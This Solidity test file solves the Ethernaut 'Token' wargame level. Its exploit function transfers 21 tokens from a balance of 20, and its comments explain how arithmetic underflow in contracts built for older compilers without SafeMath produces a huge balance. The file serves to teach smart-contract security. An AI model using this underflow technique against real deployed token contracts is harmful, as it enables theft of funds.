// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Token.sol";
import "src/levels/TokenFactory.sol";

contract TestToken is BaseTest {
    Token private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TokenFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Token(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(player), 20);
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        /** CODE YOUR EXPLOIT HERE */
        // https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE

        //(bool sent, bytes memory data) = levelAddress.call{value: 1 ether}("transfer");

        // copied the solution
        // NOTE: We start with a balance of 20 tokens

        // Send 21 tokens to the owner of the contract, we are not going to miss those 21 :D
        // The exploit in this case is to leverage the fact that
        // 1) The contract is using Solidity <0.8.x, because of this it's prone to under/over flow math
        // 2) It's not using SafeMath that add under/over flow checks prior to Solidity 0.8
        // Read more here:
        // - https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html
        // - Search on google for Solidity underflow / overflow you will find a lot of content
        // Underflow works like this: if you are trying to subtract from `a` a value that will make `a` go underzero
        // it will start again from the max value of the type of `a`. This happens because `a` is an unsigned integer
        // so the value can go from 0 to 2^256 - 1.
        // a = 20 -> a = a - 21 -> a = 2^256 - 1
        // Now our balance will be a huge number!

        level.transfer(address(levelAddress), 21);

        emit log_named_uint("Player Balance", level.balanceOf(player));

        vm.stopPrank();
    }
}
